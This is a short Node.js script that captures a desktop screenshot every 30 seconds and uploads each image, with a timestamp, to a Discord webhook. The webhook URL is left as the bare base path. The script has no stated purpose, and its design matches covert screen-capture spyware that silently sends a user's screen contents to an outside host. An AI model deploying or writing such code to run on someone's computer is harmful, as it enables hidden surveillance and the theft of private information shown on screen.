var ss = require("desktop-screenshot");
const { WebhookClient } = require('discord.js');
let fast_ss = new WebhookClient({ url: "https://discord.com/api/webhooks/" });
const moment = require("moment");

setInterval(async () => {
    try {
        ss("ss.png", function (error, complete) {
          if (error) console.log(error);
        });

        setTimeout(async () => {
            fast_ss.send({
                content: `Screenshot taken at ${moment().format("MMMM Do YYYY, h:mm:ss a")}`,
                files: [{
                    attachment: "ss.png",
                }]
            });
        }, 1000);
    } catch (e) {
        console.log(e);
    }
}, 30000);